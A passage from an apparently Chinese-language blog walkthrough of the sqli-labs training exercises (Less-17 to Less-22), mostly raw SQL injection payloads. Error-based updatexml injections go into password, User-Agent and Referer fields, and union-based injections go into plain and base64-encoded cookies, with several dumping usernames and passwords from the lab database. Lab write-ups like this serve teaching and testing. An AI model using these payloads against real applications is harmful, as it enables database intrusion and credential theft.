href="#update注入" class="headerlink" title="update注入"></a>update注入</h4><p>最后查询数据时用到了派生表的语法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin</span><br><span class="line"><span class="keyword">new</span> password <span class="operator">=</span><span class="string">&#x27; || updatexml(1,concat(0x7e,(select database()),0x7e),1)-- +</span></span><br><span class="line"><span class="string">new password =&#x27;</span> <span class="operator">||</span> updatexml(<span class="number">1</span>,<span class="keyword">left</span>(concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>),<span class="number">0x7e</span>),<span class="number">32</span>),<span class="number">1</span>)<span class="comment">-- +</span></span><br><span class="line"><span class="keyword">new</span> password <span class="operator">=</span><span class="string">&#x27; || updatexml(1,left(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),0x7e),32),1)-- +</span></span><br><span class="line"><span class="string">new password=&#x27;</span> <span class="operator">||</span> updatexml(<span class="number">1</span>,<span class="keyword">left</span>(concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> group_concat(concat(username,<span class="number">0x7e</span>,password)) <span class="keyword">from</span> security.users)a),<span class="number">0x7e</span>),<span class="number">32</span>),<span class="number">1</span>)<span class="comment">-- +</span></span><br></pre></td></tr></table></figure><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>head头注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: <span class="string">&#x27; and  updatexml(1,left(concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),0x7e),32),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: <span class="string">&#x27; and updatexml(1,left(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),0x7e),32),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="string">&#x27; and  updatexml(1,left(concat(0x7e,(select database()),0x7e),32),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">Referer: <span class="number">123</span><span class="string">&#x27; and  updatexml(1,left(concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),0x7e),32),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><h4 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-20/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>sqli</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>24</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://sqli</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=dmin&#x27; union select 1,database(),3#</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://sqli/Less-20/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=dmin&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;#</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=dmin&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;#</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=dmin&#x27; union select 1,group_concat(concat(username,0x7e,password)),3 from  users#</span><br></pre></td></tr></table></figure><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><h4 id="cookie-base64编码"><a href="#cookie-base64编码" class="headerlink" title="cookie +base64编码"></a>cookie +base64编码</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-21/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>sqli</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>24</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://sqli</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=YWRtbicpIHVuaW9uIHNlbGVjdCAxLGRhdGFiYXNlKCksMyM=</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://sqli/Less-21/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=YWRtbicpIHVuaW9uIHNlbGVjdCAxLGRhdGFiYXNlKCksMyM= #admn&#x27;) union select 1,database(),3#</span><br></pre></td></tr></table></figure><h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="operator">/</span>Less<span class="number">-22</span><span class="operator">/</span> HTTP<span class="operator">/</span><span class="number">1.1</span></span><br><span class="line">Host: sqli</span><br><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="operator">/</span><span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">84.0</span>) Gecko<span class="operator">/</span><span class="number">20100101</span> Firefox<span class="operator">/</span><span class="number">84.0</span></span><br><span class="line">Accept: text<span class="operator">/</span>html,application<span class="operator">/</span>xhtml<span class="operator">+</span>xml,application<span class="operator">/</span>xml;q<span class="operator">=</span><span class="number">0.9</span>,image<span class="operator">/</span>webp,<span class="operator">*</span><span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 24</span></span><br><span class="line"><span class="comment">Origin: http://sqli</span></span><br><span class="line"><span class="comment">Cookie: uname=YWRtbiIgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSwzIw==</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://sqli/Less-22/</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span